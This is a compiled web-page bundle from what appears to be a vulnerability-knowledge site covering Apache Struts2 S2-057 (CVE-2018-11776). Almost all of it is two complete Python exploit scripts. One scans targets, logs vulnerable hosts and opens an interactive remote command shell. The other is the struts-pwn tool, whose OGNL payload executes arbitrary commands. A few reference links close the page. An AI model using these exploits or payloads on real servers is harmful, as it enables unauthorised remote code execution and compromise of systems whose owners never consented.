                                result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
                                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
                            <span class="token keyword">except</span><span class="token punctuation">:</span>
                                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        x <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>BLUE<span class="token operator">+</span><span class="token string">&quot;     [-] NO VULNERABLE &quot;</span><span class="token operator">+</span>ENDC <span class="token operator">+</span> <span class="token string">&quot;Payload: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
            x<span class="token operator">=</span>x<span class="token operator">+</span><span class="token number">1</span>

        <span class="token comment"># CVE-2018-11776 ---------------------------------------------------------------------------------</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>BLUE<span class="token operator">+</span><span class="token string">&quot;     [-] NO VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot; [+] EJECUTANDO EXPLOIT CVE-2018-11776&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        x <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">while</span> x <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment">#Filtramos la url solo dominio</span>
            url <span class="token operator">=</span> host<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;#&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%23&#39;</span><span class="token punctuation">)</span>
            url <span class="token operator">=</span> host<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%20&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">&#39;://&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
                url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">&quot;http://&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            scheme <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme
            site <span class="token operator">=</span> scheme <span class="token operator">+</span> <span class="token string">&#39;://&#39;</span> <span class="token operator">+</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc

            <span class="token comment">#Filtramos la url solo path</span>
            file_path <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>path
            <span class="token keyword">if</span> <span class="token punctuation">(</span>file_path <span class="token operator">==</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                file_path <span class="token operator">=</span> <span class="token string">&#39;/&#39;</span>

            valida <span class="token operator">=</span> validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                result <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>site<span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token operator">+</span>exploit3<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>valida<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>file_path<span class="token punctuation">)</span><span class="token punctuation">.</span>text

                <span class="token keyword">if</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;ASCII&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;No such&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Directory of&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Volume Serial&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;inet&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;root:&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;uid=&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;accounts&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Cuentas&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot;   [-] VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    owned <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;vulnsite.txt&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span>
                    owned<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
                    owned<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

                    opcion <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] RUN THIS EXPLOIT (s/n): &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> opcion <span class="token operator">==</span> <span class="token string">&#39;s&#39;</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] GET PROMPT...\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot;   * [UPLOAD SHELL]&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>OTRO<span class="token operator">+</span><span class="token string">&quot;     Struts@Shell:$ pwnd (php)\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

                        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
                            separador <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">&quot;Struts2@Shell_3:$ &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                            espacio <span class="token operator">=</span> separador<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">)</span>
                            comando <span class="token operator">=</span> <span class="token string">&quot;%20&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>espacio<span class="token punctuation">)</span>

                            shell <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>exploit3<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token operator">+</span>shell<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        x <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>BLUE<span class="token operator">+</span><span class="token string">&quot;     [-] NO VULNERABLE &quot;</span><span class="token operator">+</span>ENDC <span class="token operator">+</span> <span class="token string">&quot;Payload: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
            x<span class="token operator">=</span>x<span class="token operator">+</span><span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot; Debe introducir el protocolo (https o http) para el dominio\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot; Debe Ingresar una Url\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="exp-2" tabindex="-1"><a class="header-anchor" href="#exp-2" aria-hidden="true">#</a> EXP 2</h3><div class="language-PYTHON line-numbers-mode" data-ext="PYTHON"><pre class="language-PYTHON"><code>#!/usr/bin/env python3
# coding=utf-8
# *****************************************************
# struts-pwn: Apache Struts CVE-2018-11776 Exploit
# Author:
# Mazin Ahmed &lt;Mazin AT MazinAhmed DOT net&gt;
# This code uses a payload from:
# https://github.com/jas502n/St2-057
# *****************************************************

from __future__ import print_function
from future import standard_library
standard_library.install_aliases()
from builtins import str
from builtins import range
import argparse
import random
import requests
import sys
try:
    from urllib import parse as urlparse
except ImportError:
    import urllib.parse

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

if len(sys.argv) &lt;= 1:
    print(&#39;[*] CVE: 2018-11776 - Apache Struts2 S2-057&#39;)
    print(&#39;[*] Struts-PWN - @mazen160&#39;)
    print(&#39;\\n%s -h for help.&#39; % (sys.argv[0]))
    exit(0)


parser = argparse.ArgumentParser()
parser.add_argument(&quot;-u&quot;, &quot;--url&quot;,
                    dest=&quot;url&quot;,
                    help=&quot;Check a single URL.&quot;,
                    action=&#39;store&#39;)
parser.add_argument(&quot;-l&quot;, &quot;--list&quot;,
                    dest=&quot;usedlist&quot;,
                    help=&quot;Check a list of URLs.&quot;,
                    action=&#39;store&#39;)
parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;,
                    dest=&quot;cmd&quot;,
                    help=&quot;Command to execute. (Default: &#39;id&#39;)&quot;,
                    action=&#39;store&#39;,
                    default=&#39;id&#39;)
parser.add_argument(&quot;--exploit&quot;,
                    dest=&quot;do_exploit&quot;,
                    help=&quot;Exploit.&quot;,
                    action=&#39;store_true&#39;)


args = parser.parse_args()
url = args.url if args.url else None
usedlist = args.usedlist if args.usedlist else None
cmd = args.cmd if args.cmd else None
do_exploit = args.do_exploit if args.do_exploit else None

headers = {
    &#39;User-Agent&#39;: &#39;struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)&#39;,
    # &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&#39;,
    &#39;Accept&#39;: &#39;*/*&#39;
}
timeout = 3


def parse_url(url):
    &quot;&quot;&quot;
    Parses the URL.
    &quot;&quot;&quot;

    # url: http://example.com/demo/struts2-showcase/index.action

    url = url.replace(&#39;#&#39;, &#39;%23&#39;)
    url = url.replace(&#39; &#39;, &#39;%20&#39;)

    if (&#39;://&#39; not in url):
        url = str(&quot;http://&quot;) + str(url)
    scheme = urllib.parse.urlparse(url).scheme

    # Site: http://example.com
    site = scheme + &#39;://&#39; + urllib.parse.urlparse(url).netloc

    # FilePath: /demo/struts2-showcase/index.action
    file_path = urllib.parse.urlparse(url).path
    if (file_path == &#39;&#39;):
        file_path = &#39;/&#39;

    # Filename: index.action
    try:
        filename = url.split(&#39;/&#39;)[-1]
    except IndexError:
        filename = &#39;&#39;

    # File Dir: /demo/struts2-showcase/
    file_dir = file_path.rstrip(filename)
    if (file_dir == &#39;&#39;):
        file_dir = &#39;/&#39;

    return({&quot;site&quot;: site,
            &quot;file_dir&quot;: file_dir,
            &quot;filename&quot;: filename})


def build_injection_inputs(url):
    &quot;&quot;&quot;
    Builds injection inputs for the check.
    &quot;&quot;&quot;

    parsed_url = parse_url(url)
    injection_inputs = []
    url_directories = parsed_url[&quot;file_dir&quot;].split(&quot;/&quot;)

    try:
        url_directories.remove(&quot;&quot;)
    except ValueError:
        pass

    for i in range(len(url_directories)):
        injection_entry = &quot;/&quot;.join(url_directories[:i])

        if not injection_entry.startswith(&quot;/&quot;):
            injection_entry = &quot;/%s&quot; % (injection_entry)

        if not injection_entry.endswith(&quot;/&quot;):
            injection_entry = &quot;%s/&quot; % (injection_entry)

        injection_entry += &quot;{{INJECTION_POINT}}/&quot;  # It will be renderred later with the payload.
        injection_entry += parsed_url[&quot;filename&quot;]

        injection_inputs.append(injection_entry)

    return(injection_inputs)


def check(url):
    random_value = int(&#39;&#39;.join(random.choice(&#39;0123456789&#39;) for i in range(2)))
    multiplication_value = random_value * random_value
    injection_points = build_injection_inputs(url)
    parsed_url = parse_url(url)
    print(&quot;[%] Checking for CVE-2018-11776&quot;)
    print(&quot;[*] URL: %s&quot; % (url))
    print(&quot;[*] Total of Attempts: (%s)&quot; % (len(injection_points)))
    attempts_counter = 0

    for injection_point in injection_points:
        attempts_counter += 1
        print(&quot;[%s/%s]&quot; % (attempts_counter, len(injection_points)))
        testing_url = &quot;%s%s&quot; % (parsed_url[&quot;site&quot;], injection_point)
        testing_url = testing_url.replace(&quot;{{INJECTION_POINT}}&quot;, &quot;\${{%s*%s}}&quot; % (random_value, random_value))
        try:
            resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
        except Exception as e:
            print(&quot;EXCEPTION::::--&gt; &quot; + str(e))
            continue
        if &quot;Location&quot; in list(resp.headers.keys()):
            if str(multiplication_value) in resp.headers[&#39;Location&#39;]:
                print(&quot;[*] Status: Vulnerable!&quot;)
                return(injection_point)
    print(&quot;[*] Status: Not Affected.&quot;)
    return(None)


def exploit(url, cmd):
    parsed_url = parse_url(url)

    injection_point = check(url)
    if injection_point is None:
        print(&quot;[%] Target is not vulnerable.&quot;)
        return(0)
    print(&quot;[%] Exploiting...&quot;)

    payload = &quot;&quot;&quot;%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{0}%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D&quot;&quot;&quot;.format(cmd)

    testing_url = &quot;%s%s&quot; % (parsed_url[&quot;site&quot;], injection_point)
    testing_url = testing_url.replace(&quot;{{INJECTION_POINT}}&quot;, payload)

    try:
        resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
    except Exception as e:
        print(&quot;EXCEPTION::::--&gt; &quot; + str(e))
        return(1)

    print(&quot;[%] Response:&quot;)
    print(resp.text)
    return(0)


def main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit):
    if url:
        if not do_exploit:
            check(url)
        else:
            exploit(url, cmd)

    if usedlist:
        URLs_List = []
        try:
            f_file = open(str(usedlist), &quot;r&quot;)
            URLs_List = f_file.read().replace(&quot;\\r&quot;, &quot;&quot;).split(&quot;\\n&quot;)
            try:
                URLs_List.remove(&quot;&quot;)
            except ValueError:
                pass
            f_file.close()
        except Exception as e:
            print(&quot;Error: There was an error in reading list file.&quot;)
            print(&quot;Exception: &quot; + str(e))
            exit(1)
        for url in URLs_List:
            if not do_exploit:
                check(url)
            else:
                exploit(url, cmd)

    print(&quot;[%] Done.&quot;)


if __name__ == &quot;__main__&quot;:
    try:
        main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit)
    except KeyboardInterrupt:
        print(&quot;\\nKeyboardInterrupt Detected.&quot;)
        print(&quot;Exiting...&quot;)
        exit(0)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,21);function h(_,w){const a=o("ExternalLinkIcon");return i(),l("div",null,[u,r,n("ul",null,[n("li",null,[n("a",d,[s("https://cwiki.apache.org/confluence/display/WW/S2-057"),t(a)])]),n("li",null,[n("a",k,[s("https://lgtm.com/blog/apache_struts_CVE-2018-11776"),t(a)])]),n("li",null,[n("a",v,[s("https://xz.aliyun.com/t/2618"),t(a)])]),n("li",null,[n("a",m,[s("https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg"),t(a)])])]),b,n("p",null,[s("使用来自"),n("a",g,[s("S2-057 漏洞分析"),t(a)]),s("的有效Payload和 POC：")]),q])}const x=p(c,[["render",h],["__file","Struts2 S2-057 远程代码执行漏洞 CVE-2018-11776.html.vue"]]);export{x as default};
